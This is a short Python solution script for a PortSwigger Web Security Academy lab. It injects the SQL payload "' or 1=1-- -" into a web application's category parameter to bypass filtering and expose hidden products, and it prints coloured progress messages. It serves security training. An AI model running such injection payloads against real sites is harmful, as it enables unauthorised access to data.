###############################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 12/9/2023
#
# PortSwigger LAB: SQL injection vulnerability in WHERE clause allowing
#                  retrieval of hidden data
#
# Steps: 1. Inject payload in the "category" query parameter
#        2. Retrieve all products without filtering
#
################################################################################

###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########
url = "https://0a620099038c27e7808c2623003800ad.web-security-academy.net" # change this url to your lab
try:
    # the payload to inject
    payload = "' or 1=1-- -"
    # fetch the page with the injected payload
    inject = requests.get(f"{url}/filter?category=Accessories{payload}")
    print(Fore.WHITE + "1. Injecting payload.. " + Fore.GREEN + "OK")
    if inject.status_code == 200:
        print(Fore.WHITE + "2. Retrieving all products without filtering.. " + Fore.GREEN + "OK")
        print(
            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    else:
        print(Fore.RED + "[!] Failed to inject the payload")
except:
    # this is the place where you should handle the exception
    # I just print a message here for simplicity
    print(Fore.RED + "[!] Failed to inject the payload through exception")
